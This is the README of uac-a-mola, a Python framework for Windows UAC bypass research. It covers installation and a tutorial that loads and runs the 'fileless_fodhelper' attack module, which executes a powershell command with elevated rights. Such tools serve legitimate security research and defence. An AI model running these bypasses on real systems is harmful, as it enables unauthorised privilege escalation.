# uac-a-mola
# Installation
To install uac-a-mola you have to perform the following actions:
1. **Download and install python 2.7.x for Windows** taking into account your particular infrastructure, you can find the binaries here: https://www.python.org/downloads/
2. **Add the python path to the _path_ enviroment variable**. You can do this by carrying out the following steps:
    1. Right click to _mycomputer_ and left click to properties
    2. Left click to Advance system configuration
    3. Lef click to Enviroment Variables
    4. In the _system variables_ box, double left click to _Path_ 
    5. Left clicking into _New_ add the following paths:
        * C:\Python27\
        * C:\Python27\scripts\
3. **Download uac-a-mola tool from github** by downloading the .zip file or by clonning the repo.
4. **Open the folder _uac-a-mola-master_ with a cmd and execute the following command**:
```
pip install -r requirements.txt
```
Uac-a-mola is now ready to rock! You can test its functionality by typing:
```
cd uacamola
python uacamola.py
```
# Tutorial
This is a brief section that explains the use of some of the uac-a-mola modules:

## Attack modules
Using the attack modules is something very simple that hardly requires explanation. The only thing you have to do is load the corresponding module in the framework using the **_load_** command, you can see the options or input parameters using the **_show_** command, with the **_run_** command the module is executed:
```
uac-a-mola> load modules\attack\fileless_fodhelper.py
[+] Loading module...
[+] Module loaded!
uac-a-mola[fileless_fodhelper.py]> show

 Author
 ------
 |_Santiago Hernandez Ramos

 Name
 ----
 |_Fileless Fodhelper

 Description
 -----------
 |_Fileless - Fodhelper bypass UAC

 Options (Field = Value)
 -----------------------
 |_instruction = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C echo mola > c:\pwned.txt (Elevated Code)

uac-a-mola[fileless_fodhelper.py]> set instruction powershell.exe
uac-a-mola[fileless_fodhelper.py]> run
[+] Running module...
```
## Mitigate modules

## Research modules
# Write your own modules


# Support
Please report any error to shramos@protonmail.com or just open an issue in GitHub. Your collaboration is appreciated!
